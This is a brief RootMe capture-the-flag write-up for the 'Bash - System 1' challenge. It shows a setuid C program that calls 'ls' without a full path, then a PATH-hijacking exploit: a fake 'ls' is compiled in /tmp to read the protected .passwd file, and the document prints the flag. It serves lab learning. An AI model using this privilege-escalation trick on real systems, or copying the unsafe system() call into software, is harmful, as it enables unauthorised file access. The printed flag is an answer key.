---
title: RootMe BashSystem1 WriteUp
date: 2023-10-02 
categories: [RootMe, AppScript]
tags: [RootMe, RootMe - AppScript, WriteUp]
author: barabulkit
---

# Bash - System 1

Source code from this challenge

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

so we need to change ls to cat somehow
we can copy that source to tmp and recompile with cat

```shell
cp ch11.c /tmp
vim /tmp/ch11.c
```

edit the sources

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("cat /challenge/app-script/ch11/.passwd");
    return 0;
}
```

compile with

```shell
gcc /tmp/ch11.c -o /tmp/ls
```

and then change PATH var and launch ch11 executable

```shell
export PATH=/tmp:$PATH
./ch11
```

we will get flag `!oPe96a/.s8d5`